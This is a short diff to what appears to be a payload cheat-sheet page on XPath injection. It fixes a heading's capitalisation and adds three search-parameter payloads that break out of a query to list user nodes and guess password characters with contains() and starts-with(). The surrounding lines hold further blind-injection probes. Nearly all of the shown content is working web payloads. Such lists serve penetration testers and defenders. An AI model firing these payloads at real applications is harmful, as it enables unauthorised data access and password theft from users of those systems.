@@ -1,4 +1,4 @@
-# XPATH injection
+# XPATH Injection
 
 > XPath Injection is an attack technique used to exploit applications that construct XPath (XML Path Language) queries from user-supplied input to query or navigate XML documents.
 
@@ -28,6 +28,9 @@ x' or name()='username' or 'x'='y
 ' and count(/*)=1 and '1'='1
 ' and count(/@*)=1 and '1'='1
 ' and count(/comment())=1 and '1'='1
+search=')] | //user/*[contains(*,'
+search=Har') and contains(../password,'c
+search=Har') and starts-with(../password,'c
 ```
 
 ## Blind Exploitation
